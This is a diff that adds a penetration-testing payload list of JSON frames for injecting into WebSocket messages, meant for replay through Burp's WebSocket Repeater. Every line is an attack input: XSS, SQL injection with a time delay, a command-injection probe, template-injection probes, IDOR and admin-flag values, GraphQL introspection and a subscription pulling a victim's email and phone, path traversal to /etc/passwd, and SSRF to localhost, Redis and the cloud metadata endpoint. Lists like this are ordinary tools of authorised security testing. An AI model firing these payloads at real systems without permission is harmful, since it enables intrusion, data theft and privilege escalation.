@@ -1,0 +1,41 @@
+# WebSocket message body injection seeds — JSON/text frames
+# Source: PortSwigger WebSockets, graphql-advanced.md subscriptions
+# Tier: Curated | Replay via Burp WebSocket Repeater
+
+# --- XSS in broadcast/chat ---
+{"message":"<img src=x onerror=alert(1)>"}
+{"text":"<svg onload=alert(1)>"}
+{"content":"\"><script>alert(1)</script>"}
+{"body":{"html":"<img src=x onerror=alert(document.domain)>"}}
+
+# --- SQLi in message/search fields ---
+{"query":"' OR '1'='1"}
+{"search":"test' UNION SELECT NULL--"}
+{"filter":"1; WAITFOR DELAY '0:0:5'--"}
+
+# --- Command / SSTI probes ---
+{"cmd":";id"}
+{"template":"{{7*7}}"}
+{"name":"${7*7}"}
+
+# --- IDOR / privilege in message actions ---
+{"userId":"00000000-0000-0000-0000-000000000001"}
+{"user_id":1}
+{"user_id":0}
+{"user_id":-1}
+{"role":"admin"}
+{"isAdmin":true}
+
+# --- GraphQL over WebSocket (graphql-ws / subscriptions-transport-ws) ---
+{"type":"start","id":"1","payload":{"query":"{__schema{types{name}}}"}}
+{"type":"start","id":"2","payload":{"query":"subscription{userUpdated(id:\"victim-uuid\"){email phone}}"}}
+
+# --- Path traversal in file/share messages ---
+{"path":"../../../etc/passwd"}
+{"filename":"....//....//etc/passwd"}
+{"url":"file:///etc/passwd"}
+
+# --- SSRF via message URL fields ---
+{"url":"http://127.0.0.1:6379"}
+{"avatar":"http://169.254.169.254/latest/meta-data/"}
+{"webhook":"http://localhost:8080/admin"}
